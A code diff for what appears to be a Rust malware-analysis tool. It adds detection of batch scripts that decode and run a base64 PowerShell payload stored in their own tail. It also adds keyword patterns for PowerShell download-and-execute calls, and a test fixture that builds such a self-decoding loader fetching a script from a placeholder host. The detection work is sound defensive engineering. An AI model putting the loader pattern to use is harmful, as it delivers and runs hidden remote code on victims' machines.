@@ -7222,6 +7222,7 @@ fn analyze_inner(
         analyze_extracted_payloads(&mut env, &mut out, 1);
         ps1_scan::extract_self_embedded_ps1(&mut env, &out);
         ps1_scan::scan_ps1_payloads(&mut env);
+        out = summarize_self_tail_base64_payloads(&out, &mut env);
         vbs_scan::scan_vbs_payloads(&mut env);
         js_scan::scan_js_payloads(&mut env);
         ps1_scan::scan_inline_powershell_text(&out, &mut env);
@@ -8594,6 +8595,109 @@ fn split_line_ending(line: &str) -> (&str, &str) {
     } else {
         (line, "")
     }
+}
+
+fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> String {
+    const MIN_B64_RUN: usize = 80;
+    const MAX_B64_RUN: usize = 16 * 1024 * 1024;
+
+    if !looks_like_self_tail_base64_loader_text(text) {
+        return text.to_string();
+    }
+
+    let mut changed = false;
+    let mut out = String::with_capacity(text.len().min(256 * 1024));
+    for line in text.split_inclusive('\n') {
+        let (body, newline) = split_line_ending(line);
+        let trimmed = body.trim();
+        let (candidate, was_capped) = trimmed
+            .strip_suffix("…[truncated]")
+            .map(|prefix| (prefix, true))
+            .unwrap_or((trimmed, false));
+        if !(MIN_B64_RUN..=MAX_B64_RUN).contains(&candidate.len())
+            || !candidate.bytes().all(is_base64_carrier_byte)
+        {
+            out.push_str(line);
+            continue;
+        }
+
+        use base64::Engine as _;
+        let decoded = if was_capped {
+            None
+        } else {
+            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(candidate) else {
+                out.push_str(line);
+                continue;
+            };
+            if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload_bytes(&decoded) {
+                out.push_str(line);
+                continue;
+            }
+            Some(decoded)
+        };
+        if was_capped
+            && !env
+                .all_extracted_ps1
+                .iter()
+                .any(|ps| looks_like_powershell_payload_bytes(ps))
+        {
+            out.push_str(line);
+            continue;
+        }
+
+        let leading_len = body.find(trimmed).unwrap_or(0);
+        out.push_str(&body[..leading_len]);
+        if let Some(decoded) = decoded {
+            out.push_str(&format!(
+                "::==== harrington: omitted self-tail base64 payload ({} bytes encoded, {} bytes decoded) ====",
+                candidate.len(),
+                decoded.len()
+            ));
+            rescue_truncated_urls(&String::from_utf8_lossy(&decoded), body.len(), env);
+        } else {
+            out.push_str(&format!(
+                "::==== harrington: omitted self-tail base64 payload (at least {} bytes encoded) ====",
+                candidate.len()
+            ));
+        }
+        out.push_str(newline);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: body.len() as u64,
+        });
+        changed = true;
+    }
+
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn looks_like_self_tail_base64_loader_text(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("get-content") && lower.contains("-raw") && lower.contains("frombase64string")
+}
+
+fn looks_like_powershell_payload_bytes(bytes: &[u8]) -> bool {
+    let text = if bytes.starts_with(&[0xff, 0xfe]) {
+        String::from_utf16_lossy(
+            &bytes[2..]
+                .chunks_exact(2)
+                .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
+                .collect::<Vec<_>>(),
+        )
+    } else {
+        String::from_utf8_lossy(bytes).into_owned()
+    };
+    let lower = text.to_ascii_lowercase();
+    lower.contains("powershell")
+        || lower.contains("invoke-expression")
+        || lower.contains("invoke-webrequest")
+        || lower.contains("new-object")
+        || lower.contains("frombase64string")
+        || lower.contains("downloadstring")
+        || lower.contains('$')
 }
 
 fn summarize_binary_noise_line_runs(text: &str, env: &mut Environment) -> String {
@@ -20598,6 +20702,43 @@ exit
             }),
             "tail self-read payload URL was not extracted: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn capped_ps1_self_read_tail_base64_payload_is_summarized() {
+        use base64::Engine;
+        let payload = format!(
+            "$u='https://selftail-long.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            "A".repeat(110_000)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            r#"@echo off
+powershell -NoP -C "$p='';$r=-{len}..-1;$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content $p -Raw)[$r]));iex $s"
+exit
+{b64}
+"#,
+            len = b64.len()
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://selftail-long.example/FLEE.ps1")),
+            "tail self-read payload was not normalized"
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("harrington: omitted self-tail base64 payload"),
+            "capped tail payload was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("…[truncated]"),
+            "capped duplicate tail payload remained in deobfuscated output"
         );
     }
 
